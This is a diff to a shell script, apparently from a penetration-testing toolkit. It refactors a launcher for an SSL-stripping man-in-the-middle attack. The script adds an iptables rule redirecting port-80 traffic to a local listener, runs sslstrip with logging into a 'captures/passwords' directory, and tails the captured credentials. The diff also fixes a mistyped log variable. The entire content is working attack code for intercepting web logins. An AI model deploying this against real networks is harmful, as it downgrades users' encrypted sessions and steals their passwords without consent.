@@ -33,10 +33,6 @@ f_ip_tables(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
 }
 
-f_logfile(){
-  echo "sslstrip$(date +%F-%H%M).log"
-}
-
 f_run(){
   #Path to sslstrip definitions:
   clear
@@ -48,13 +44,14 @@ f_run(){
   f_interface
   f_ip_tables
 
-  sslstrip_filename=$(f_logfile)
-  sslstrip -pfk -w /opt/pwnix/captures/passwords/$sslstrip_filename  -l 8888 $interface &
+  logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log
+
+  sslstrip -pfk -w $logfile  -l 8888 $interface &
 
   sleep 3
   echo
   echo
-  tail -f /opt/pwnix/captures/passwords/$ssl_stripfilename
+  tail -f $logfile
 }
 
 f_run
